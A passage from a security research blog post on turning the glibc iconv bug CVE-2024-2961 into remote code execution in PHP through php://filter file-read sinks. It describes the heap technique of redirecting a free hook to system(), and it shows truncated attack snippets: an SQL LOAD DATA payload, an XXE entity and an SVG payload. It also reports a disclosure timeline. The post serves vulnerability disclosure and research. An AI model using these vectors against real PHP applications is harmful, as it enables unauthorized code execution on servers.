<span class="w">            </span><span class="kt">void</span><span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">_malloc</span><span class="p">)(</span><span class="kt">size_t</span><span class="p">);</span>
<span class="w">            </span><span class="kt">void</span><span class="w">       </span><span class="p">(</span><span class="o">*</span><span class="n">_free</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">);</span>
<span class="w">            </span><span class="kt">void</span><span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">_realloc</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">std</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">custom_heap</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div><p>First, it holds every free list. By overwriting the free lists, we get an arbitrary number of <em>write-what-where</em>, with arbitrary sizes. We can use these to overwrite the last field, <code>custom_heap</code>, which contains alternative functions for <code>emalloc()</code>, <code>efree()</code> and <code>erealloc()</code> (similarly to <code>__malloc_hook</code> and its siblings in the glibc). Then, we set <code>use_custom_heap</code> to <code>1</code>, and call <code>free()</code> on a bucket, giving us an arbitrary function call with a controlled argument. Since we have access to binaries using the file read, we could build fancy ROP chains, but we want something as generic as possible; I therefore set <code>custom_heap._free</code> to <code>system</code>, allowing us to run an arbitrary bash command, in a CTF fashion.</p><p><em>Note: There are a few (many) details to the exploitation that I've left out, but the exploit is heavily commented.</em></p><h3 id="exploit-performance">Exploit performance</h3><p>Our exploit runs 3 requests: it downloads <code>/proc/self/maps</code>, and extracts both the address of PHP's heap and the filename of the libc. It then downloads the libc binary to extract the address of <code>system()</code>. Finally, it performs a final request to perform the overflow and execute our arbitrary command.</p><p>It performs very well:</p><ul><li>Works against <strong>any target</strong><ul><li>From PHP 7.0.0 (2015) to 8.3.7 (2024)</li><li>Any PHP application: Wordpress, Laravel, etc.</li></ul></li><li>It is <strong>100% reliable</strong><ul><li>Due to its implementation, it will never (?) produce a crash</li><li>A binary exploit that feels like a web exploit!</li></ul></li><li>Payload is <strong>smaller</strong> than <strong>1000 bytes</strong><ul><li>by using <code>zlib.inflate</code> and only 12 filters, the payload is really small</li><li>It fits in a GET request</li></ul></li><li>Self-contained exploit<ul><li>No need to send additional parameters as GET or POST: the exploit does everything by itself, from padding the heap to setting up the free list, and finally getting code execution</li></ul></li></ul><p>It is a single, less than 1000 bytes payload that results in <strong>remote code execution</strong> for 10 years worth of PHP versions.</p><h3 id="demo">Demo</h3><p>To illustrate, I'll target a <strong>Wordpress</strong> instance running on <strong>PHP 8.3.x</strong>. To introduce a file read vulnerability, I added the <strong>BuddyForms plugin (v2.7.7)</strong>, which is flawed with <a href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8">CVE-2023-26326</a>. The bug was originally reported as a PHAR deserialisation bug, but Wordpress does not have any deserialisation gadget chains. In any case, the target runs on PHP 8+, so it is not vulnerable to PHAR attacks.</p><video controls="" src="/images/iconv-cve-2024-2961-p1/demo.mp4" width="100%"></video><p><em>Note: if you read the <a href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8">advisory by the original finder</a>, you may see that right before the file read primitive, a <code>getimagesize()</code> call is performed to check if the file is an image. Therefore, to allow the exploit to read <code>/proc/self/maps</code> and the libc, I used <a href="https://www.ambionics.io/blog/wrapwrap-php-filters-suffix">wrapwrap</a> to make them look like GIF images.</em></p><h1 id="impact">Impact</h1><p>What is the impact on the PHP ecosystem? This is not a new vulnerability, but instead a new exploitation vector for a vulnerability. There are, however, a multitude of ways to make PHP read a file; file read primitives are very current in web applications.</p><h2 id="standard-sinks">Standard sinks</h2><p>Evidently, every standard <em>file read</em> sink of PHP is affected: <code>file_get_contents()</code>, <code>file()</code>, <code>readfile()</code>, <code>fgets()</code>, <code>getimagesize()</code>, <code>SplFileObject-&gt;read()</code>, <em>etc.</em> <strong>File writes</strong> are also affected (<code>file_put_contents()</code> and its siblings).</p><h2 id="using-vulnerabilities">Using vulnerabilities</h2><h3 id="sql-injection-to-rce">SQL injection to RCE</h3><p>If you get an SQL injection on PDO/MySQL, you might be able to use <code>LOAD DATA LOCAL INFILE</code>:</p><div class="highlight"><pre><span></span><code><span class="k">LOAD</span><span class="w"> </span><span class="k">DATA</span><span class="w"> </span><span class="k">LOCAL</span><span class="w"> </span><span class="n">INFILE</span><span class="w"> </span><span class="s1">'php://filter/cnext...'</span><span class="p">;</span>
</code></pre></div><h3 id="xxe">XXE</h3><p>XXEs are now RCEs.</p><div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version="1.0" ?&gt;</span>
<span class="cp">&lt;!DOCTYPE root [</span>
<span class="cp">    &lt;!ENTITY exploit SYSTEM "php://filter/cnext..."&gt;</span>
]&gt;
<span class="nt">&lt;root&gt;</span><span class="ni">&amp;exploit;</span><span class="nt">&lt;/root&gt;</span>
</code></pre></div><h2 id="as-a-replacement-for-phar">As a replacement for PHAR</h2><p>Contrarily to PHAR attacks, functions that just perform checks on files, such as <code>file_exists()</code>, or <code>is_file()</code>, are <strong>not</strong> affected. However, in other cases, the exploit can be used as a replacement for PHAR attack, as shown in the demo. Disabling <code>phar://</code> or updating to PHP 8 will not save you.</p><h2 id="parsing-libraries">Parsing libraries</h2><p>Every library that somehow manipulates URLs might be vulnerable. Here are some new targets that I found while working on the exploit:</p><ul><li><a href="https://packagist.org/packages/meyfa/php-svg">meyfa/php-svg</a>: Most popular SVG manipulation library</li><li><a href="https://packagist.org/packages/symfony/translation">symfony/translation</a>: XLIFF parser is vulnerable</li></ul><p>For instance, the <a href="https://packagist.org/packages/meyfa/php-svg">PHP-SVG</a> library can be attacked with such a payload:</p><div class="highlight"><pre><span></span><code><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">"100"</span><span class="w"> </span><span class="na">height=</span><span class="s">"100"</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;image</span><span class="w"> </span><span class="na">href=</span><span class="s">"php://filter/cnext/..."</span><span class="w"> </span><span class="na">width=</span><span class="s">"1"</span><span class="w"> </span><span class="na">height=</span><span class="s">"1"</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</code></pre></div><p>HTML-to-PDF parsers, such as dompdf, tcpdf, and others may also be targets.</p><h2 id="class-instantiations">Class instantiations</h2><p>Sometimes, when attacking PHP, you encounter the following primitive:</p><div class="highlight"><pre><span></span><code><span class="k">new</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cls'</span><span class="p">](</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'argument'</span><span class="p">]);</span>
</code></pre></div><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">This excellent blogpost from PTswarm</a> describes many ways to get a file read from this primitive, which may all be used to trigger the exploit. Examples include <code>SoapClient</code>, <code>Imagick</code>, <code>tidy</code>, or <code>SimpleXMLElement</code>.</p><h2 id="as-an-improvement-to-a-gadget-chain">As an improvement to a gadget chain</h2><p>If you find a file read <code>unserialize()</code> gadget chain, you can use the exploit to upgrade it to RCE. With recent applications and the fact that PHP libraries are using types more and more, it might come in handy.</p><h2 id="others-probably">Others, probably</h2><p>As long as you control the prefix of a file-read or file-write sink, you have an RCE!</p><h1 id="timeline">Timeline</h1><ul><li><strong>Last year</strong> Crash found</li><li><strong>February</strong> Started working on bug</li><li><strong>March 26th</strong> Bug reported to glibc security team<ul><li>They did an amazing job!</li></ul></li><li><strong>April 04th</strong> Bug reported to linux distros</li><li><strong>April 17th</strong> Bug released as CVE-2024-2961</li></ul><p><em>Note: The glibc security team was fast, courteous, and technically able. They shipped a patch (and all that comes with it) within a week. Many thanks!</em></p><h1 id="conclusion">Conclusion</h1><p>This concludes the first part of the series on <strong>CNEXT</strong> (CVE-2024-2961). The exploit is now available on <a href="https://github.com/ambionics/cnext-exploits/">our GitHub</a>. There is still much more to explore: what about <em>direct calls</em> to <code>iconv()</code> ? What happens if the file read is <em>blind</em>?</p><p>In part 2, we'll dive deeper in the PHP engine to target an <code>iconv()</code> call found in a very popular <strong>PHP webmail</strong>. I'll describe the impact of such direct calls on the PHP ecosystem, and show you some <em>unexpected</em> sinks. Finally, in part 3, we'll cover blind file read exploitation.</p><p>Stay tuned!</p><h1 id="were-hiring">We're hiring!</h1><p>Ambionics is an entity of <a href="https://www.lexfo.fr/">Lexfo</a>, and we're hiring! To learn more about job opportunities, do not hesitate to contact us at <a href="mailto:rh@lexfo.fr">rh@lexfo.fr</a>. <em>We're a french-speaking company, so we expect candidates to be fluent in our beautiful language.</em></p><p>If you have any questions, you can hit me up on Twitter <a href="https://twitter.com/cfreal_">@cfreal_</a>.</p></div></div></div></div></section></div></section><footer class="fullwidth black-bg t-center"><a class="scroll top-button black-bg" href="#page-header" style="z-index:999;" title="Back to Top"><i class="fa fa-angle-double-up" style="z-index:999;"></i></a><div class="footer-inner relative t-center"><p class="footer2" style="font-size:16px;"><a href="/how-it-works" title="How it works">How it works</a> <a href="/offers" title="Offers">Offers</a> <a href="/about" title="About">About</a> <a href="/blog/" title="Blog">Blog</a> <a class="cookies-configure" href="" title="Cookies">Cookies</a> <a href="/legal" title="Legal">Legal notice</a></p><p class="footer2" style="margin:10px;"><span style="font-size:14px;">Copyright 2024 Ambionics Security by LEXFO. All Rights Reserved.</span></p><a class="social" href="https://twitter.com/ambionics" title="Twitter"><i class="fa fa-twitter fa-lg" style="padding:10px;"></i></a> <a class="social" href="https://www.linkedin.com/company/ambionics-security" title="LinkedIn"><i class="fa fa-linkedin fa-lg" style="padding:10px;"></i></a> <a class="social" href="https://github.com/ambionics" title="GitHub"><i class="fa fa-github fa-lg" style="padding:10px;"></i></a></div></footer><div class="alert alert-info hidden" id="cookies-popup"><p>We use cookies to see how our website is being used. If you continue browsing the site, you consent to this. <a class="dark" data-target="#cookies-modal" data-toggle="modal" href="#">Learn more about cookies and configure your settings.</a></p><p><button aria-hidden="true" class="btn btn-success cookies-accept" data-dismiss="alert" data-service="__all" type="button">Accept</button><button aria-hidden="true" class="btn btn-primary cookies-configure" type="button">Configure</button></p></div><div aria-labelledby="cookies-modal-label" class="modal fade" id="cookies-modal" role="dialog" tabindex="-1"><div class="modal-dialog" role="document"><div class="modal-content"><div class="modal-header"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">Ã</span></button><h4 class="modal-title" id="cookies-modal-label">Cookies management</h4></div><div class="modal-body"><p>A cookie is a piece of information deposited on a web userâs hard drive by the server of the website they are browsing. It contains several data points: the name of the server which deposited it, a unique ID number, possibly an expiry date. <br/> This information is sometimes hosted on the computer in a simple text file the server then accesses to read and write information.</p><p>Two types of Cookies are deposited and/or read from the Site:</p><ul><li>An audience-measuring cookie (Google Analytics) which allows it to analyze the Userâs browsing and measure the audience of the Site (number of visits, number of pages seen, visitorsâ activity on the Site, frequency of return visits on the Site).</li><li>A User interface customization cookie that allows for the language chosen by the User by clicking the appropriate flag (French or English) to be remembered.</li></ul><p>The User is informed that:</p><ul><li>The audience-measuring cookie (Google Analytics) is valid for 12 months starting from its initial deposit on the Userâs terminal.</li><li>The User interface customization cookie is valid for 12 months starting from its initial deposit on the Userâs terminal.</li></ul><p>The User is informed that they may oppose the deposit and/or consultation of cookies using their browserâs settings prior to their deposit and one by one.</p><p>Each browserâs settings are different, the User can find the steps to follow to manage cookies in the Help section of their browser.</p><hr/><div class="cookies-services"><span class="cookies-service service-ga service-__all"><span class="name">Google Analytics</span><button aria-hidden="true" class="btn btn-success cookies-accept" data-dismiss="alert" data-service="ga" type="button">Accept</button><button aria-hidden="true" class="btn btn-danger cookies-deny" data-dismiss="alert" data-service="ga" type="button">Deny</button></span></div></div><div class="modal-footer"></div></div></div></div><script src="/theme/webassets-external/535a4a89976f71de0254c0f5cc8ed385_jquery-2.1.3.min.js"></script><script src="/theme/webassets-external/d8e5f1775a67cdb9ed962f8bf6990e51_bootstrap.min.js"></script><script src="/theme/webassets-external/5354bec4160e25616aadc658c888227c_jquery.appear.js"></script><script src="/theme/webassets-external/53b876516d4db40629f42895d03e3dee_modernizr-latest.js"></script><script src="/theme/webassets-external/33f9c8ac7d0685005a1c050ca4a14b34_jquery.easing.1.3.js"></script><script src="/theme/webassets-external/f18af5c9a0dce10b0fa507f101942667_jquery.simple-text-rotator.js"></script><script src="/theme/webassets-external/6e029b44297a623d282bdb08693d7128_owl.carousel.min.js"></script><script src="/theme/webassets-external/c923609d93fd4b18f2960b780c263be6_jquery.parallax-1.1.3.js"></script><script src="/theme/webassets-external/b222f7ea6d454c2eab0fbf228ed2a205_skrollr.min.js"></script><script src="/theme/webassets-external/55861961ef7ae88cee014fb929823251_js.cookie.js"></script><script src="/theme/webassets-external/a1a7d465afdebd49013cec1da7768303_main.js"></script><script type="text/javascript">
var  mn = $(".main-nav");
mns = "main-nav-scrolled";
hdr = $('header').height();
$(window).scroll(function() {
    if( $(this).scrollTop() > hdr ) {
        mn.addClass(mns);
    } else {
        mn.removeClass(mns);
    }
});
</script></body></html>